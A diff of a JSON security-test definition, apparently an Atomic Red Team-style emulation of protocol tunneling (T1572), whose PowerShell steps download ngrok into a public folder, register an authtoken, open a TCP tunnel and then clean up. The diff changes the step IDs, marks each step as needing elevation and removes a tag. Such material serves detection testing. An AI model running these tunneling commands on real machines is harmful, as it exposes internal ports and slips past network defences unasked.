@@ -7,25 +7,25 @@
   ],
   "steps": [
     {
-      "id": "58f05a58-c2f4-4ac4-a7d9-0cbe5fdb9419",
+      "id": "5390813e-0e2a-4327-9d4a-4ecc99362cd0",
       "type": "execute-command",
       "data": {
         "command": "C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken #{api_token} | Out-Null\nStart-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp #{port_num} } | Out-Null\nStart-Sleep -s 5 \nStop-Job -Name Job1 | Out-Null\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "31719a97-4a98-4a55-b835-aeef02c3c872",
+      "id": "7160a91f-44b2-4c2d-9b79-f685b6cc3324",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item C:\\Users\\Public\\ngrok -Recurse -ErrorAction Ignore\nRemove-Item C:\\%userprofile%\\AppData\\Local\\ngrok -ErrorAction Ignore\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "efbfa6c3-a343-4d08-afdc-e4325a34501f",
+      "id": "dab713ff-db11-4771-9363-81f788853533",
       "name": "Check dependency 1/1",
       "description": "Download ngrok\n",
       "type": "execute-command",
@@ -33,10 +33,10 @@
         "command": "if (Test-Path C:\\Users\\Public\\ngrok) {exit 0} else {exit 1}\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "d73893c7-b3f8-484c-9ba3-f7dbfbe5622d",
+      "id": "97d06cec-e0e6-4feb-a4cf-ab2dd039745a",
       "name": "Resolve dependency 1/1",
       "description": "Download ngrok\n",
       "type": "execute-command",
@@ -44,10 +44,10 @@
         "command": "New-Item -Path C:\\Users\\Public\\ngrok -ItemType Directory | Out-Null\nInvoke-WebRequest #{download} -OutFile C:\\Users\\Public\\ngrok\\ngrok-v3-stable-windows-amd64.zip\nExpand-Archive C:\\Users\\Public\\ngrok\\ngrok-v3-stable-windows-amd64.zip -DestinationPath C:\\Users\\Public\\ngrok\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "13e4be3a-edee-4189-9828-077fa4846f77",
+      "id": "163be1be-51c2-4c50-86ab-1d2be5636886",
       "name": "Re-check dependency 1/1",
       "description": "Download ngrok\n",
       "type": "execute-command",
@@ -55,44 +55,43 @@
         "command": "if (Test-Path C:\\Users\\Public\\ngrok) {exit 0} else {exit 1}\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "58f05a58-c2f4-4ac4-a7d9-0cbe5fdb9419",
+      "s": "5390813e-0e2a-4327-9d4a-4ecc99362cd0",
       "p": "on-success",
-      "o": "31719a97-4a98-4a55-b835-aeef02c3c872"
+      "o": "7160a91f-44b2-4c2d-9b79-f685b6cc3324"
     },
     {
-      "s": "58f05a58-c2f4-4ac4-a7d9-0cbe5fdb9419",
+      "s": "5390813e-0e2a-4327-9d4a-4ecc99362cd0",
       "p": "on-failure",
-      "o": "31719a97-4a98-4a55-b835-aeef02c3c872"
+      "o": "7160a91f-44b2-4c2d-9b79-f685b6cc3324"
     },
     {
-      "s": "efbfa6c3-a343-4d08-afdc-e4325a34501f",
+      "s": "dab713ff-db11-4771-9363-81f788853533",
       "p": "on-success",
-      "o": "58f05a58-c2f4-4ac4-a7d9-0cbe5fdb9419"
+      "o": "5390813e-0e2a-4327-9d4a-4ecc99362cd0"
     },
     {
-      "s": "efbfa6c3-a343-4d08-afdc-e4325a34501f",
+      "s": "dab713ff-db11-4771-9363-81f788853533",
       "p": "on-failure",
-      "o": "d73893c7-b3f8-484c-9ba3-f7dbfbe5622d"
+      "o": "97d06cec-e0e6-4feb-a4cf-ab2dd039745a"
     },
     {
-      "s": "d73893c7-b3f8-484c-9ba3-f7dbfbe5622d",
+      "s": "97d06cec-e0e6-4feb-a4cf-ab2dd039745a",
       "p": "on-success",
-      "o": "13e4be3a-edee-4189-9828-077fa4846f77"
+      "o": "163be1be-51c2-4c50-86ab-1d2be5636886"
     },
     {
-      "s": "13e4be3a-edee-4189-9828-077fa4846f77",
+      "s": "163be1be-51c2-4c50-86ab-1d2be5636886",
       "p": "on-failure",
-      "o": "58f05a58-c2f4-4ac4-a7d9-0cbe5fdb9419"
+      "o": "5390813e-0e2a-4327-9d4a-4ecc99362cd0"
     }
   ],
   "tags": [
-    "T1572",
-    "atomic-red-team"
+    "T1572"
   ],
   "input_arguments": [
     {
